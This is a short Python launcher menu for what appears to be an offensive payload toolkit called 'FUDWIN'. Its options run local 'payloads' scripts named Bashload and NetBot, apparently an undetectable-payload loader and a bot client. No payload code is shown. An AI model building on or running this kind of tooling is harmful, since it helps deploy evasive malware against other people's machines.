import os
import sys
import time

print(" ______________ _________________   ___       ___ _________       ")
print("|   _    |     Y     |      _  . \ |   |     |   |     _    \     ")
print("|.  1____|.    |     |.     |     \|.  |     |.  |.    |     |    ")
print("|.   __) |.    |     |.     |      |.  |     |.  |.    |     |    ")
print("|:  |    |:    1     |:     1      |:  |_____|:  |:    |     |    ")
print("|::.|    |::.. .     |::.. .      /|::.. .   |::.|::.  |     |    ")
print(" ---      ----------- -----------   --------- --- -----------  1.0")
print("                                 by guille-exploit@protonmail.com ")
print("    Select a option to begin. ")
print("")
print("   [ 1 ] Bashload (Bash) (NEW) ")
print("   [ 2 ] NetBot (Python3) (NEW) ")
print("   [ 3 ] exit \n")
opt = input("[FUDWIN]--> ")
os.chdir("payloads")
if opt == "1":
  os.system("python3 bashloader.py")
elif opt == "2":
  os.system("python3 nbot.py")
else:
  sys.exit()
